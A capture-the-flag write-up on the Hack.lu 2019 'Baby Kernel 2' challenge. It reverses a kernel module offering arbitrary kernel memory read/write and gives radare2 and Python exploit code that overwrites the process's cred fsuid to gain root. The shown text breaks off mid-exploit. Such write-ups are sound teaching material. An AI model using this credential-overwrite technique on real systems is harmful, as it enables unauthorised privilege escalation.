<!doctype html><html lang=en><head><title>Hack.lu 2019 - Baby Kernel 2 challenge writeup</title><meta charset=UTF-8><meta content="width=device-width,initial-scale=1.0" name=viewport><link href=/fonts.css rel=stylesheet><link href=/style.css rel=stylesheet><body><main><nav><ul><li><a href=/>/index</a><li><a href=/b/>/blog</a><li><a href=https://github.com/xarkes>/github</a><li><a href=https://x.com/xarkes_>/x</a></ul></nav><div><h1>Hack.lu 2019 - Baby Kernel 2 challenge writeup</h1><p><strong>Published on 2019-12-09</strong><p>Last october, I participated to <a href=https://2019.hack.lu/>Hack.lu</a> Capture The Flag with my team <a href=https://securimag.org/>Securimag</a>.<p>I did this writeup as all the ones I've read do not explain how they managed to reliably find the offset of <code>real_cred</code> in the <code>current_task</code> structure.</p><span id=continue-reading></span><p>I didn't have much time to allocate for that challenge, and as I'm interested in exploitation, I quickly jumped on "Baby Kernel 2" as it was marked as easy and dealing with kernels.<h2 id=overview>Overview</h2><p>The challenge provides a <a href=/files/baby_kernel_2.zip>ZIP archive</a> that contains multiple files:<ul><li><code>vmlinux</code> - A <a href=https://en.wikipedia.org/wiki/Vmlinux>linux kernel</a><li><code>System.map</code> - The symbols location for that kernel<li><code>initramfs.cpio.gz</code> - The initial root filesystem<li><code>bzImage</code> - Contains the bootloader and the stripped and compressed kernel<li><code>run.sh</code> - A script to run the kernel with qemu</ul><p>Note: In the archive I provide, I removed <code>vmlinux</code> as it is quite heavy and unecessary because <code>System.map</code> is given as well.<p>It is possible to extract the kernel from <code>bzImage</code> by using the <a href=https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux>extract-vmlinux</a> script from the linux kernel source code. Otherwise, <a href=https://github.com/ReFirmLabs/binwalk>binwalk</a> will manage to extract it as well:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#65737e># Extract with extract-vmlinux
</span><span style=color:#bf616a>./extract-vmlinux</span><span> ./bzImage > vmlinux
</span><span style=color:#65737e># Extract with binwalk
</span><span style=color:#bf616a>binwalk -e</span><span> ./bzImage
</span></code></pre><p>Let's run it to see what it looks like:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>./run.sh
</span><span>
</span><span>...
</span><span>
</span><span>----- Menu -----
</span><span>1. Read
</span><span>2. Write
</span><span>3. Show me my uid
</span><span>4. Read file
</span><span>5. Any hintz?
</span><span>6. Bye!
</span><span>>
</span></code></pre><p>Right after the linux VM booted, there's not shell to greet us, but only a small program that asks us do to an action.<h2 id=understanding-everything>Understanding everything</h2><p>Since I was not doing the CTF to win, but rather just for fun, I decided to take the time to understand everything.<p>First of all, I decided to extract the default file system to see what was available on the system. To do so I used the following commands:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$ mkdir root
</span><span>$ cd root
</span><span>$ cp ../initramfs.cpio.gz ./
</span><span>$ gunzip ./initramfs.cpio.gz
</span><span>$ cpio -id < ./initramfs.cpio
</span><span>7393 blocks
</span><span>$ ls
</span><span>bin  client_kernel_baby_2  etc  flag  home  init  initramfs.cpio  lib  proc  root  sys  usr  var
</span><span>$
</span></code></pre><p>Now to understand what was this program that was ran during startup, I read the <code>init</code> file. There are many lines, but more importantly:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>chmod</span><span> 700 /flag
</span><span style=color:#bf616a>mkdir -p</span><span> /lib/modules/$(</span><span style=color:#bf616a>uname -r</span><span>)
</span><span style=color:#bf616a>insmod </span><span>"</span><span style=color:#a3be8c>/lib/modules/</span><span>$</span><span style=color:#a3be8c>(</span><span style=color:#bf616a>uname -r</span><span style=color:#a3be8c>)/kernel_baby_2.ko</span><span>"
</span><span style=color:#bf616a>chmod</span><span> +rw /dev/flux_baby_2
</span><span style=color:#bf616a>chmod</span><span> +x /client_kernel_baby_2
</span><span style=color:#bf616a>sleep</span><span> 2
</span><span style=color:#bf616a>su</span><span> user</span><span style=color:#bf616a> -c</span><span> /client_kernel_baby_2
</span></code></pre><ol><li>During <a href=https://en.wikipedia.org/wiki/Linux_startup_process#Init_process>init</a> the file <code>/flag</code> is set to read, write and execute permissions for user <code>root</code> only.<li>A kernel module is loaded<li>The file <code>/client_kernel_baby_2</code> is set as executable, and is started with the user named <code>user</code>.</ol><h3 id=the-client>The client</h3><p>Quickly, I decided to check what the client file does. In fact, I was intrigued as the challenge was supposed to be an easy kernel exploitation, but here only a userland application was available.<p>The binary is not stripped, and we can quickly understand what is happening. Using <a href=https://github.com/radareorg/radare2>radare2</a>, I quickly disassembled the program to understand what it does. As we've seen above, there are 6 actions available and 3 to 6 do what they mean to do.<ul><li>The command <code>3</code> will call <code>system("id");</code><li>The command <code>4</code> will read try to open <code>/flag</code> and read its content.<li>The command <code>5</code> will print a hint.<li>The command <code>6</code> will exit the program, that will cause the system to halt.</ul><p>So nothing suprising from here, but what do <code>1</code> and <code>2</code> do exactly? There are two unstripped functions in the binary that are named <code>do_read</code> and <code>do_write</code>. And what do they do? They trigger an <a href=http://man7.org/linux/man-pages/man2/ioctl.2.html>ioctl</a> (request 901 for the read function, request 902 for the write function) with the given parameters that are read from the user input.<p>Alright, so I think it's time to disassemble the kernel module.<h3 id=the-kernel-module>The kernel module</h3><p>The kernel module is rather small, and not stripped. We can spot the function <code>driver_ioctl</code> and inspect it. It will compare the first argument with 901 and 902 and if it matches any it will either call the function <code>read</code> or <code>_copy_from_user</code> respectively with the arguments from the user.<p>The function <code>read</code> will use <a href=https://www.fsl.cs.sunysb.edu/kernel-api/re256.html>copy_to_user</a> to read data from the kernel to userland, and <a href=https://www.fsl.cs.sunysb.edu/kernel-api/re257.html>copy_from_user</a> is used to copy data from userland (our input program) into the kernel.<p>So now it's becoming clearer that we can interact with kernel land through the provided program.<h2 id=exploitation>Exploitation</h2><p>So, the goal of the challenge is to read the <code>/flag</code> file, but as we've seen earlier, it is readable for user <code>root</code> only. How can we do that? Well I think there are multiple ways of doing it, but here is the way I chose. Since it's not necessary to pop a shell or anything too complicated, the only goal of the challenge is to elevate the privileges of the current process to <code>root</code>.<p>Usually it is possible to do so by calling <code>commit_creds(prepare_kernel_cred(0));</code>. In our context all we can do is read and write some kernel space memory. So let's see what the <a href=https://elixir.bootlin.com/linux/v4.19.77/source/kernel/cred.c#L427>commit_creds</a> function do.<pre class=language-C data-lang=C style=color:#c0c5ce;background-color:#2b303b><code class=language-C data-lang=C><span style=color:#b48ead>int </span><span style=color:#8fa1b3>commit_creds</span><span>(</span><span style=color:#b48ead>struct</span><span> cred *</span><span style=color:#bf616a>new</span><span>)
</span><span>{
</span><span>	</span><span style=color:#b48ead>struct</span><span> task_struct *task = current;
</span><span>	</span><span style=color:#b48ead>const struct</span><span> cred *old = task->real_cred;
</span><span>
</span><span>	</span><span style=color:#65737e>/* ... */
</span><span>
</span><span>	</span><span style=color:#bf616a>rcu_assign_pointer</span><span>(task->real_cred, new);
</span><span>	</span><span style=color:#bf616a>rcu_assign_pointer</span><span>(task->cred, new);
</span><span>
</span><span>	</span><span style=color:#65737e>/* ... */
</span><span>
</span><span>	</span><span style=color:#65737e>/* release the old obj and subj refs both */
</span><span>	</span><span style=color:#bf616a>put_cred</span><span>(old);
</span><span>	</span><span style=color:#bf616a>put_cred</span><span>(old);
</span><span>	</span><span style=color:#b48ead>return </span><span style=color:#d08770>0</span><span>;
</span><span>}
</span></code></pre><p>The linux kernel provides a macro <a href=https://elixir.bootlin.com/linux/v4.19.77/source/arch/x86/include/asm/current.h#L18>current</a> also known as <code>struct task_struct *current_task</code> that is a pointer to the currently executed process.<p>Here the function <code>commit_creds</code> just updates the <code>current->real_cred</code> and <code>current->cred</code> pointers to the new credentials.<p>The <code>task_struct</code> structure is quite big, but has indeed the <code>real_cred</code> and <code>cred</code> members:<pre class=language-C data-lang=C style=color:#c0c5ce;background-color:#2b303b><code class=language-C data-lang=C><span style=color:#b48ead>struct </span><span>task_struct {
</span><span>	</span><span style=color:#65737e>/* ... */
</span><span>
</span><span>	</span><span style=color:#65737e>/* Process credentials: */
</span><span>	</span><span style=color:#65737e>/* Tracer's credentials at attach: */
</span><span>	</span><span style=color:#b48ead>const struct </span><span>cred __rcu		*ptracer_cred;
</span><span>	</span><span style=color:#65737e>/* Objective and real subjective task credentials (COW): */
</span><span>	</span><span style=color:#b48ead>const struct </span><span>cred __rcu		*real_cred;
</span><span>	</span><span style=color:#65737e>/* Effective (overridable) subjective task credentials (COW): */
</span><span>	</span><span style=color:#b48ead>const struct </span><span>cred __rcu		*cred;
</span><span>
</span><span>	</span><span style=color:#65737e>/* ... */
</span><span>};
</span></code></pre><p>The <a href=https://elixir.bootlin.com/linux/v4.19.77/source/include/linux/cred.h#L116>cred</a> structure looks as follows:<pre class=language-C data-lang=C style=color:#c0c5ce;background-color:#2b303b><code class=language-C data-lang=C><span style=color:#b48ead>struct </span><span>cred {
</span><span>	atomic_t	usage;
</span><span style=color:#b48ead>#ifdef</span><span> CONFIG_DEBUG_CREDENTIALS
</span><span>	atomic_t	subscribers;	</span><span style=color:#65737e>/* number of processes subscribed */
</span><span>	</span><span style=color:#b48ead>void		</span><span>*put_addr;
</span><span>	</span><span style=color:#b48ead>unsigned</span><span>	magic;
</span><span style=color:#b48ead>#define </span><span>CRED_MAGIC	</span><span style=color:#d08770>0x43736564
</span><span style=color:#b48ead>#define </span><span>CRED_MAGIC_DEAD	</span><span style=color:#d08770>0x44656144
</span><span style=color:#b48ead>#endif
</span><span>	kuid_t		uid;		</span><span style=color:#65737e>/* real UID of the task */
</span><span>	kgid_t		gid;		</span><span style=color:#65737e>/* real GID of the task */
</span><span>	kuid_t		suid;		</span><span style=color:#65737e>/* saved UID of the task */
</span><span>	kgid_t		sgid;		</span><span style=color:#65737e>/* saved GID of the task */
</span><span>	kuid_t		euid;		</span><span style=color:#65737e>/* effective UID of the task */
</span><span>	kgid_t		egid;		</span><span style=color:#65737e>/* effective GID of the task */
</span><span>	kuid_t		fsuid;		</span><span style=color:#65737e>/* UID for VFS ops */
</span><span>	kgid_t		fsgid;		</span><span style=color:#65737e>/* GID for VFS ops */
</span><span>	</span><span style=color:#b48ead>unsigned</span><span>	securebits;	</span><span style=color:#65737e>/* SUID-less security management */
</span><span>	kernel_cap_t	cap_inheritable; </span><span style=color:#65737e>/* caps our children can inherit */
</span><span>	kernel_cap_t	cap_permitted;	</span><span style=color:#65737e>/* caps we're permitted */
</span><span>	kernel_cap_t	cap_effective;	</span><span style=color:#65737e>/* caps we can actually use */
</span><span>	kernel_cap_t	cap_bset;	</span><span style=color:#65737e>/* capability bounding set */
</span><span>	kernel_cap_t	cap_ambient;	</span><span style=color:#65737e>/* Ambient capability set */
</span><span style=color:#b48ead>#ifdef</span><span> CONFIG_KEYS
</span><span>	</span><span style=color:#b48ead>unsigned char</span><span>	jit_keyring;	</span><span style=color:#65737e>/* default keyring to attach requested
</span><span style=color:#65737e>					 * keys to */
</span><span>	</span><span style=color:#b48ead>struct </span><span>key __rcu *session_keyring; </span><span style=color:#65737e>/* keyring inherited over fork */
</span><span>	</span><span style=color:#b48ead>struct </span><span>key	*process_keyring; </span><span style=color:#65737e>/* keyring private to this process */
</span><span>	</span><span style=color:#b48ead>struct </span><span>key	*thread_keyring; </span><span style=color:#65737e>/* keyring private to this thread */
</span><span>	</span><span style=color:#b48ead>struct </span><span>key	*request_key_auth; </span><span style=color:#65737e>/* assumed request_key authority */
</span><span style=color:#b48ead>#endif
</span><span style=color:#b48ead>#ifdef</span><span> CONFIG_SECURITY
</span><span>	</span><span style=color:#b48ead>void		</span><span>*security;	</span><span style=color:#65737e>/* subjective LSM security */
</span><span style=color:#b48ead>#endif
</span><span>	</span><span style=color:#b48ead>struct </span><span>user_struct *user;	</span><span style=color:#65737e>/* real user ID subscription */
</span><span>	</span><span style=color:#b48ead>struct </span><span>user_namespace *user_ns; </span><span style=color:#65737e>/* user_ns the caps and keyrings are relative to. */
</span><span>	</span><span style=color:#b48ead>struct </span><span>group_info *group_info;	</span><span style=color:#65737e>/* supplementary groups for euid/fsgid */
</span><span>	</span><span style=color:#65737e>/* RCU deletion */
</span><span>	</span><span style=color:#b48ead>union </span><span>{
</span><span>		</span><span style=color:#b48ead>int</span><span> non_rcu;			</span><span style=color:#65737e>/* Can we skip RCU deletion? */
</span><span>		</span><span style=color:#b48ead>struct</span><span> rcu_head	rcu;		</span><span style=color:#65737e>/* RCU deletion hook */
</span><span>	};
</span><span>} __randomize_layout;
</span></code></pre><p>In the end, what we can do is just to overwrite most of the <code>real_cred</code> structure members to update the user id and group id to 0 (root) until we can manage to read the flag. In fact, it is only necessary to update the <code>fsuid</code> field as it is the one that will be checked when accessing a file on the filesystem.<p>Once we understood all of this, we have to find where those fields are located in the memory. Luckily, we were provided the <code>System.map</code> file that contains all the symbols we need. In the original archive, <code>vmlinux</code> was also provided and already contained all those symbols. The first action that is done in the <code>commit_creds</code> function is to dereference the <code>current_task</code> and access the <code>real_cred</code> member.<pre class=language-C data-lang=C style=color:#c0c5ce;background-color:#2b303b><code class=language-C data-lang=C><span style=color:#b48ead>int </span><span style=color:#8fa1b3>commit_creds</span><span>(</span><span style=color:#b48ead>struct</span><span> cred *</span><span style=color:#bf616a>new</span><span>)
</span><span>{
</span><span>	</span><span style=color:#b48ead>struct</span><span> task_struct *task = current;
</span><span>	</span><span style=color:#b48ead>const struct</span><span> cred *old = task->real_cred;
</span><span>	</span><span style=color:#65737e>/* ... */
</span></code></pre><p>We can retrieve the offset for <code>commit_creds</code> with a single <code>grep</code> command:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>$</span><span> grep commit_creds ./System.map
</span><span style=color:#bf616a>ffffffff81050c50</span><span> T commit_creds
</span><span style=color:#bf616a>ffffffff816d4c80</span><span> r __ksymtab_commit_creds
</span><span style=color:#bf616a>ffffffff816dc9b2</span><span> r __kstrtab_commit_creds
</span></code></pre><p>And now check the disassembly inside radare2:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$ r2 ./vmlinux
</span><span>[0x01000000]> pd 10 @ 0xffffffff81050c50
</span></code></pre><pre class=codehilite>
            <font color=#ed9366>0xffffffff81050c50</font>      <font color=#50d0e0>55</font>             <font color=#50d0e0>push</font><font color=#e6e1cf> rbp</font><br>            <font color=#ed9366>0xffffffff81050c51</font>      <font color=#50d0e0>48</font><font color=#808080>89</font><font color=#808080>e5</font>         <font color=#d9d8d7>mov</font><font color=#e6e1cf> rbp</font>,<font color=#e6e1cf> rsp</font><br>            <font color=#ed9366>0xffffffff81050c54</font>      <font color=#50d0e0>41</font><font color=#50d0e0>55</font>           <font color=#50d0e0>push</font><font color=#e6e1cf> r13</font><br>            <font color=#ed9366>0xffffffff81050c56</font>      <font color=#50d0e0>4c</font><font color=#808080>8b</font><font color=#50d0e0>2c</font><font color=#50d0e0>25</font><font color=#50d0e0>40</font><font color=#808080>a0</font><font color=#808080>.</font>  <font color=#d9d8d7>mov</font><font color=#e6e1cf> r13</font>,<font color=#e6e1cf> qword</font><font color=#e6e1cf> </font>[<font color=#f28779>0xffffffff8183a040</font>]<br>            <font color=#ed9366>0xffffffff81050c5e</font>      <font color=#50d0e0>41</font><font color=#50d0e0>54</font>           <font color=#50d0e0>push</font><font color=#e6e1cf> r12</font><br>            <font color=#ed9366>0xffffffff81050c60</font>      <font color=#50d0e0>53</font>             <font color=#50d0e0>push</font><font color=#e6e1cf> rbx</font><br>            <font color=#ed9366>0xffffffff81050c61</font>      <font color=#50d0e0>4d</font><font color=#808080>8b</font><font color=#808080>a5</font><font color=#808080>f8</font><font color=#808080>03</font><font color=#738699>00</font><font color=#808080>.</font>  <font color=#d9d8d7>mov</font><font color=#e6e1cf> r12</font>,<font color=#e6e1cf> qword </font>[<font color=#e6e1cf>r13 </font>+<font color=#e6e1cf> </font><font color=#f28779>0x3f8</font>]<br>            <font color=#ed9366>0xffffffff81050c68</font>      <font color=#50d0e0>4d</font><font color=#50d0e0>39</font><font color=#808080>a5</font><font color=#738699>00</font><font color=#808080>04</font><font color=#738699>00</font><font color=#808080>.</font>  <font color=#50d0e0>cmp qword </font>[<font color=#e6e1cf>r13 </font>+<font color=#e6e1cf> </font><font color=#f28779>0x400</font>],<font color=#e6e1cf> r12</font><br>        <font color=#c2d94c>╭</font>─< <font color=#ed9366>0xffffffff81050c6f</font>      <font color=#808080>0f</font><font color=#808080>85</font><font color=#808080>f1</font><font color=#738699>00</font><font color=#738699>00</font><font color=#738699>00</font>   <font color=#c2d94c>jne 0xffffffff81050d66</font><br>        <font color=#c2d94c>│</font>   <font color=#ed9366>0xffffffff81050c75</font>      <font color=#808080>8b</font><font color=#808080>07</font>           <font color=#d9d8d7>mov</font><font color=#e6e1cf> eax</font>,<font color=#e6e1cf> dword</font><font color=#e6e1cf> </font>[<font color=#e6e1cf>rdi</font>]
</pre><p>As we can see the <code>current_task</code> pointer is dereferenced with the offset <code>0x3f8</code>, so this corresponds to the <code>real_cred</code> pointer. It is possible to automate this process with the following python script:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>import </span><span>r2pipe
</span><span>
</span><span>r2 = r2pipe.</span><span style=color:#bf616a>open</span><span>('</span><span style=color:#a3be8c>./vmlinux</span><span>')
</span><span>r2.</span><span style=color:#bf616a>cmd</span><span>('</span><span style=color:#a3be8c>s sym.commit_creds</span><span>')
</span><span>r2.</span><span style=color:#bf616a>cmd</span><span>('</span><span style=color:#a3be8c>aei; aeim</span><span>')
</span><span style=color:#b48ead>for </span><span style=color:#bf616a>_ </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#d08770>50</span><span>):
</span><span>    </span><span style=color:#65737e># Step instruction per instruction
</span><span>    r2.</span><span style=color:#bf616a>cmd</span><span>('</span><span style=color:#a3be8c>aes</span><span>')
</span><span>    op = r2.</span><span style=color:#bf616a>cmdj</span><span>('</span><span style=color:#a3be8c>aoj 1 @ PC</span><span>')[</span><span style=color:#d08770>0</span><span>]
</span><span>    </span><span style=color:#65737e># Check for memory dereference
</span><span>    </span><span style=color:#b48ead>if </span><span style=color:#96b5b4>len</span><span>(op['</span><span style=color:#a3be8c>opex</span><span>']['</span><span style=color:#a3be8c>operands</span><span>']) == </span><span style=color:#d08770>2 </span><span>and op['</span><span style=color:#a3be8c>opex</span><span>']['</span><span style=color:#a3be8c>operands</span><span>'][</span><span style=color:#d08770>1</span><span>]['</span><span style=color:#a3be8c>type</span><span>'] == '</span><span style=color:#a3be8c>mem</span><span>':
</span><span>        </span><span style=color:#65737e># Get reg that contains the struct pointer
</span><span>        </span><span style=color:#b48ead>if </span><span>op['</span><span style=color:#a3be8c>opex</span><span>']['</span><span style=color:#a3be8c>operands</span><span>'][</span><span style=color:#d08770>1</span><span>]['</span><span style=color:#a3be8c>disp</span><span>'] == current_task_addr:
</span><span>            usedreg = op['</span><span style=color:#a3be8c>opex</span><span>']['</span><span style=color:#a3be8c>operands</span><span>'][</span><span style=color:#d08770>0</span><span>]['</span><span style=color:#a3be8c>value</span><span>']
</span><span>            </span><span style=color:#b48ead>continue
</span><span>        </span><span style=color:#65737e># If reg base is current_task, then get the offset
</span><span>        </span><span style=color:#b48ead>if </span><span>'</span><span style=color:#a3be8c>base</span><span>' in op['</span><span style=color:#a3be8c>opex</span><span>']['</span><span style=color:#a3be8c>operands</span><span>'][</span><span style=color:#d08770>1</span><span>] and op['</span><span style=color:#a3be8c>opex</span><span>']['</span><span style=color:#a3be8c>operands</span><span>'][</span><span style=color:#d08770>1</span><span>]['</span><span style=color:#a3be8c>base</span><span>'] == usedreg:
</span><span>            real_cred_offset = op['</span><span style=color:#a3be8c>opex</span><span>']['</span><span style=color:#a3be8c>operands</span><span>'][</span><span style=color:#d08770>1</span><span>]['</span><span style=color:#a3be8c>disp</span><span>']
</span><span>            </span><span style=color:#b48ead>break
</span><span style=color:#96b5b4>print</span><span>(</span><span style=color:#96b5b4>hex</span><span>(real_cred_offset))
</span><span>r2.</span><span style=color:#bf616a>quit</span><span>()
</span></code></pre><p>And it will print this offset as well! That's the only reliable way I found to quickly compute the right offset for <code>real_cred</code>, as it may vary from kernel versions and compilation options.<p>Now using either the <code>vmlinux</code> file (which already contains symbols) or the <code>System.map</code> file, we can get the address of <code>current_task</code>.<p>The exploit will be as follow:<ol><li>Get <code>current_task</code> pointer<li>Get <code>current->real_cred</code> pointer<li>Overwrite <code>current->real_cred->fsuid</code> to 0<li>Print the flag</ol><p>As the initial challenge is done remotely, it's possible to make our local script act as a remote target. I use the following trick thanks to socat:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>socat</span><span> tcp-l:1337,reuseaddr,fork exec:"</span><span style=color:#a3be8c>bash -c ./run.sh</span><span>"
</span></code></pre><p>And we can create the following exploit:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#65737e>#!/usr/bin/env python
</span><span>
</span><span style=color:#b48ead>import </span><span>socket
</span><span style=color:#b48ead>import </span><span>telnetlib
</span><span style=color:#b48ead>import </span><span>r2pipe
</span><span>
</span><span>
</span><span style=color:#b48ead>class </span><span style=color:#ebcb8b>Socket</span><span style=color:#eff1f5>():
</span><span>    </span><span style=color:#b48ead>def </span><span style=color:#96b5b4>__init__</span><span>(</span><span style=color:#bf616a>self</span><span>, </span><span style=color:#bf616a>host</span><span>, </span><span style=color:#bf616a>port</span><span>):
</span><span>        </span><span style=color:#bf616a>self</span><span>.s = socket.</span><span style=color:#bf616a>create_connection</span><span>((host, port))
</span><span>
</span><span>    </span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>recv</span><span>(</span><span style=color:#bf616a>self</span><span>, </span><span style=color:#bf616a>d</span><span>): </span><span style=color:#b48ead>return </span><span style=color:#bf616a>self</span><span>.s.</span><span style=color:#bf616a>recv</span><span>(d)
</span><span>
</span><span>    </span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>send</span><span>(</span><span style=color:#bf616a>self</span><span>, </span><span style=color:#bf616a>d</span><span>): </span><span style=color:#b48ead>return </span><span style=color:#bf616a>self</span><span>.s.</span><span style=color:#bf616a>send</span><span>(d)
</span><span>
</span><span>    </span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>recv_until</span><span>(</span><span style=color:#bf616a>self</span><span>, </span><span style=color:#bf616a>d</span><span>):
</span><span>        data = </span><span style=color:#b48ead>b</span><span>''
</span><span>        </span><span style=color:#b48ead>if </span><span style=color:#96b5b4>type</span><span>(d) == </span><span style=color:#96b5b4>type</span><span>(''):
</span><span>            d = d.</span><span style=color:#bf616a>encode</span><span>()
</span><span>        </span><span style=color:#b48ead>while </span><span>not data.</span><span style=color:#bf616a>endswith</span><span>(d):
</span><span>            tmp = </span><span style=color:#bf616a>self</span><span>.s.</span><span style=color:#bf616a>recv</span><span>(</span><span style=color:#d08770>1</span><span>)
</span><span>            </span><span style=color:#b48ead>if </span><span>not tmp:
</span><span>                </span><span style=color:#b48ead>break
</span><span>            data += tmp
</span><span>        </span><span style=color:#b48ead>return </span><span>data
</span><span>
</span><span>    </span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>recv_all</span><span>(</span><span style=color:#bf616a>self</span><span>):
</span><span>        data = </span><span style=color:#b48ead>b</span><span>''
</span><span>        </span><span style=color:#b48ead>while </span><span style=color:#d08770>True</span><span>:
</span><span>            part = </span><span style=color:#bf616a>self</span><span>.s.</span><span style=color:#bf616a>recv</span><span>(</span><span style=color:#d08770>4096</span><span>)
</span><span>            data += part
</span><span>            </span><span style=color:#b48ead>if </span><span style=color:#96b5b4>len</span><span>(part) < </span><span style=color:#d08770>4096</span><span>:
</span><span>                </span><span style=color:#b48ead>break
</span><span>        </span><span style=color:#b48ead>return </span><span>data
</span><span>
</span><span>    </span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>interact</span><span>(</span><span style=color:#bf616a>self</span><span>):
</span><span>        t = telnetlib.</span><span style=color:#bf616a>Telnet</span><span>()
</span><span>        t.sock = </span><span style=color:#bf616a>self</span><span>.s
</span><span>        t.</span><span style=color:#bf616a>interact</span><span>()
</span><span>
</span><span>
</span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>plog</span><span>(</span><span style=color:#bf616a>m</span><span>):
</span><span>    </span><span style=color:#96b5b4>print</span><span>('</span><span style=color:#a3be8c>[+] </span><span>' + m)
</span><span>
</span><span>
</span><span style=color:#65737e># Get symbols info from System.map
</span><span style=color:#b48ead>for </span><span>l </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>open</span><span>('</span><span style=color:#a3be8c>./public/System.map</span><span>', '</span><span style=color:#a3be8c>r</span><span>'):
</span><span>    </span><span style=color:#b48ead>if </span><span>'</span><span style=color:#a3be8c>D current_task</span><span>' in l:
</span><span>        current_task_addr = </span><span style=color:#bf616a>int</span><span>(l.</span><span style=color:#bf616a>split</span><span>(' ')[</span><span style=color:#d08770>0</span><span>], </span><span style=color:#d08770>16</span><span>)
</span><span>current_task_addr = </span><span style=color:#d08770>0xffffffff8183a040
</span><span>real_cred_offset = </span><span style=color:#d08770>0x3f8
</span><span style=color:#bf616a>plog</span><span>('</span><span style=color:#a3be8c>Found current_task: 0x</span><span style=color:#d08770>{:x}</span><span>'.</span><span style=color:#bf616a>format</span><span>(current_task_addr))
</span><span style=color:#bf616a>plog</span><span>('</span><span style=color:#a3be8c>Found real_cred_offset: 0x</span><span style=color:#d08770>{:x}</span><span>'.</span><span style=color:#bf616a>format</span><span>(real_cred_offset))
</span><span>
</span><span>
</span><span style=color:#65737e>#############
</span><span style=color:#65737e># Exploit it!
</span><span style=color:#96b5b4>print</span><span>('</span><span style=color:#a3be8c>-------------------</span><span>')
</span><span style=color:#bf616a>plog</span><span>('</span><span style=color:#a3be8c>Connecting to remote VM...</span><span>')
</span><span>s = </span><span style=color:#bf616a>Socket</span><span>('</span><span style=color:#a3be8c>localhost</span><span>', </span><span style=color:#d08770>1337</span><span>)
</span><span>s.</span><span style=color:#bf616a>recv_until</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#a3be8c>> </span><span>')
</span><span style=color:#bf616a>plog</span><span>('</span><span style=color:#a3be8c>VM Started!</span><span>')
</span><span>
</span><span style=color:#65737e># 1. Get current_task_ptr
</span><span>s.</span><span style=color:#bf616a>send</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#a3be8c>1</span><span style=color:#96b5b4>\n</span><span>')
</span><span>s.</span><span style=color:#bf616a>recv_until</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#a3be8c>> </span><span>')
</span><span>pl = </span><span style=color:#96b5b4>hex</span><span>(current_task_addr)[</span><span style=color:#d08770>2</span><span>:] + '</span><span style=color:#96b5b4>\n</span><span>'
</span><span>s.</span><span style=color:#bf616a>send</span><span>(pl.</span><span style=color:#bf616a>encode</span><span>('</span><span style=color:#a3be8c>utf-8</span><span>'))
</span><span>s.</span><span style=color:#bf616a>recv_until</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#a3be8c>power level is: </span><span>')
</span><span>v = s.</span><span style=color:#bf616a>recv_until</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#96b5b4>\r\n</span><span>')
</span><span>current_task_ptr = </span><span style=color:#bf616a>int</span><span>(v, </span><span style=color:#d08770>16</span><span>)
</span><span style=color:#bf616a>plog</span><span>('</span><span style=color:#a3be8c>Found current_task pointer: 0x</span><span style=color:#d08770>{:x}</span><span>'.</span><span style=color:#bf616a>format</span><span>(current_task_ptr))
</span><span>
</span><span style=color:#65737e># 2. Get real_cred_ptr
</span><span>s.</span><span style=color:#bf616a>send</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#a3be8c>1</span><span style=color:#96b5b4>\n</span><span>')
</span><span>s.</span><span style=color:#bf616a>recv_until</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#a3be8c>></span><span>')
</span><span>pl = </span><span style=color:#96b5b4>hex</span><span>(current_task_ptr + real_cred_offset)[</span><span style=color:#d08770>2</span><span>:] + '</span><span style=color:#96b5b4>\n</span><span>'
</span><span>s.</span><span style=color:#bf616a>send</span><span>(pl.</span><span style=color:#bf616a>encode</span><span>('</span><span style=color:#a3be8c>utf-8</span><span>'))
</span><span>s.</span><span style=color:#bf616a>recv_until</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#a3be8c>power level is: </span><span>')
</span><span>v = s.</span><span style=color:#bf616a>recv_until</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#96b5b4>\r\n</span><span>')
</span><span>real_cred_ptr = </span><span style=color:#bf616a>int</span><span>(v, </span><span style=color:#d08770>16</span><span>)
</span><span style=color:#bf616a>plog</span><span>('</span><span style=color:#a3be8c>Found real_cred pointer: 0x</span><span style=color:#d08770>{:x}</span><span>'.</span><span style=color:#bf616a>format</span><span>(real_cred_ptr))
</span><span>
</span><span style=color:#65737e># 3. Overwrite everything with 0
</span><span>s.</span><span style=color:#bf616a>recv_until</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#a3be8c>> </span><span>')
</span><span>s.</span><span style=color:#bf616a>send</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#a3be8c>2</span><span style=color:#96b5b4>\n</span><span>')
</span><span>s.</span><span style=color:#bf616a>recv_until</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#a3be8c>></span><span>')
